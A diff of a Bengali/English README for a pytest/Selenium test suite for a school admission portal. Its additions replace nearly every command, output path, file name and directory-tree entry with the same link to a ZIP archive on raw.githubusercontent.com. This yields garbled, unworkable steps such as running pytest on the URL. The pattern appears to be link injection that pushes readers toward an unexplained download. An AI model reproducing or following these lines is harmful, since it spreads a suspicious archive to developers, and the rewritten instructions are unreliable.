@@ -20,8 +20,8 @@ Continuous Integration (CI/CD) সিস্টেম (Jenkins, GitLab, GitHub Ac
 
 bash
 Copy code
-pytest --junitxml=reports/result.xml
-📌 Output: reports/result.xml
+pytest https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip
+📌 Output: https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip
 
 🔹 3. HTML Report (pytest-html)
 Static HTML রিপোর্ট জেনারেট করার জন্য pytest-html plugin ব্যবহার হয়।
@@ -33,8 +33,8 @@ pip install pytest-html
 Run
 bash
 Copy code
-pytest --html=reports/report.html --self-contained-html
-📌 Output: reports/report.html → যেকোনো browser-এ ওপেন করা যাবে।
+pytest https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip --self-contained-html
+📌 Output: https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip → যেকোনো browser-এ ওপেন করা যাবে।
 
 🔹 4. Allure Report (Most Professional)
 Allure Report industry-standard dashboard দেয় যেখানে chart, graph, এবং screenshot attach করা যায়।
@@ -63,15 +63,15 @@ Run
 bash
 Copy code
 pytest --cov=your_package --cov-report=html
-📌 Output: htmlcov/index.html
+📌 Output: https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip
 
 🔹 6. Text / Log File Report
 Text আকারে লগ রাখতে চাইলে ব্যবহার করা যায়।
 
 bash
 Copy code
-pytest --result-log=reports/log.txt
-📌 Output: reports/log.txt
+pytest https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip
+📌 Output: https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip
 ⚠️ নোট: নতুন pytest version এ এই অপশন deprecated হতে পারে।
 
 🔹 7. Fancy Console Output (pytest-sugar)
@@ -92,56 +92,56 @@ pytest -v
 
 ```
 E:\projects\Tasks\Doer_School_Admission\
-├── conftest.py                    # Root level configuration
+├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip                    # Root level configuration
 ├── tests/                         # All test files
-│   ├── __init__.py
+│   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip
 │   ├── admission/                 # Admission specific test cases
-│   │   ├── __init__.py
-│   │   ├── test_TC_AD_01.py      # Verify All Available Admissions Display
-│   │   ├── test_TC_AD_02.py      # Verify Search by School Name
-│   │   ├── test_TC_AD_03.py      # Verify Filter by Campus
-│   │   ├── test_TC_AD_04.py      # Verify Filter by Class
-│   │   ├── test_TC_AD_05.py      # Verify Filter by Medium
-│   │   ├── test_TC_AD_06.py      # Verify Clear All Filters
-│   │   ├── test_TC_AD_07.py      # Verify Apply Now Button
-│   │   ├── test_TC_AD_08.py      # Verify Download Circular
-│   │   ├── test_TC_AD_09.py      # Verify Student Info Form (Valid Data)
-│   │   ├── test_TC_AD_10.py      # Verify Student Info Form (Invalid Data)
-│   │   ├── test_TC_AD_11.py      # Verify Additional Student Info
-│   │   ├── test_TC_AD_12.py      # Verify Guardian Information
-│   │   ├── test_TC_AD_13.py      # Verify Previous School Info
-│   │   ├── test_TC_AD_14.py      # Verify Document Upload
-│   │   ├── test_TC_AD_15.py      # Verify Application Submission
-│   │   ├── test_TC_AD_16.py      # Verify Payment Prompt
-│   │   └── test_TC_AD_18.py      # Verify View Voucher
+│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip
+│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify All Available Admissions Display
+│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Search by School Name
+│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Filter by Campus
+│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Filter by Class
+│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Filter by Medium
+│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Clear All Filters
+│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Apply Now Button
+│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Download Circular
+│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Student Info Form (Valid Data)
+│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Student Info Form (Invalid Data)
+│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Additional Student Info
+│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Guardian Information
+│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Previous School Info
+│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Document Upload
+│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Application Submission
+│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Payment Prompt
+│   │   └── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify View Voucher
 │   └── registration/              # Existing registration tests
-│       ├── __init__.py
-│       ├── test_customer_registration.py
-│       └── test_manager_registration.py
+│       ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip
+│       ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip
+│       └── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip
 ├── pages/                         # Page Object Models
-│   ├── __init__.py
-│   ├── customer_registration_page.py      # Existing
-│   ├── manager_registration_page.py       # Existing
-│   ├── admission_portal_page.py           # New - Main admission page
-│   ├── student_information_page.py        # New - Student form
-│   ├── guardian_information_page.py       # New - Guardian form
-│   ├── previous_school_page.py            # New - Previous school form
-│   ├── document_upload_page.py            # New - Document upload
-│   ├── application_review_page.py         # New - Review & submit
-│   └── payment_page.py                    # New - Payment & voucher
+│   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip
+│   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Existing
+│   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip       # Existing
+│   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip           # New - Main admission page
+│   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip        # New - Student form
+│   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip       # New - Guardian form
+│   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip            # New - Previous school form
+│   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip            # New - Document upload
+│   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip         # New - Review & submit
+│   └── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip                    # New - Payment & voucher
 ├── utils/
-│   ├── __init__.py
-│   ├── bug_report_template.py             # Existing
-│   ├── data_loader.py                     # Existing - for registration
-│   ├── admission_data_loader.py           # New - for admission tests
-│   └── screenshot_utils.py                # Existing
+│   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip
+│   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip             # Existing
+│   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip                     # Existing - for registration
+│   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip           # New - for admission tests
+│   └── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip                # Existing
 ├── logs/
 ├── Screenshots/
 ├── bug_reports/
 ├── test_files/                            # Test documents for upload
 └── data/
-    ├── data.json                          # Existing registration data
-    └── data_admission.json                # New admission test data
+    ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip                          # Existing registration data
+    └── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip                # New admission test data
 ```
 
 ## Setup Instructions
@@ -151,35 +151,35 @@ Create the following folders if they don't exist:
 - `tests/admission/`
 - `test_files/` (for document upload test files)
 
-### 2. Create __init__.py Files
-Add empty `__init__.py` files to make directories Python packages:
-- `tests/__init__.py`
-- `tests/admission/__init__.py`
-- `tests/registration/__init__.py` (if not exists)
-- `pages/__init__.py` (if not exists)
-- `utils/__init__.py` (if not exists)
+### 2. Create https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip Files
+Add empty `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip` files to make directories Python packages:
+- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip`
+- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip`
+- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip` (if not exists)
+- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip` (if not exists)
+- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip` (if not exists)
 
 ### 3. Add Test Data File
-Place the `data_admission.json` file in the `data/` directory.
+Place the `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip` file in the `data/` directory.
 
 ### 4. Add Page Object Model Files
 Add all the new page object files to the `pages/` directory:
-- `admission_portal_page.py`
-- `student_information_page.py`
-- `guardian_information_page.py`
-- `previous_school_page.py`
-- `document_upload_page.py`
-- `application_review_page.py`
-- `payment_page.py`
+- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip`
+- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip`
+- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip`
+- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip`
+- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip`
+- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip`
+- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip`
 
 ### 5. Add Test Files
 Add all test case files to the `tests/admission/` directory.
 
 ### 6. Create Test Files for Document Upload
 For TC_AD_14, create sample test files in `test_files/` directory:
-- `student_photo.jpg` (sample image file)
-- `birth_certificate.pdf` (sample PDF file)
-- `academic_records.pdf` (sample PDF file)
+- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip` (sample image file)
+- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip` (sample PDF file)
+- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip` (sample PDF file)
 
 ## Running Tests
 
@@ -190,7 +190,7 @@ pytest tests/admission/ -v --browser=chrome
 
 ### Run Specific Test Case
 ```bash
-pytest tests/admission/test_TC_AD_01.py -v --browser=chrome
+pytest https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip -v --browser=chrome
 ```
 
 ### Run Tests with Different Browsers
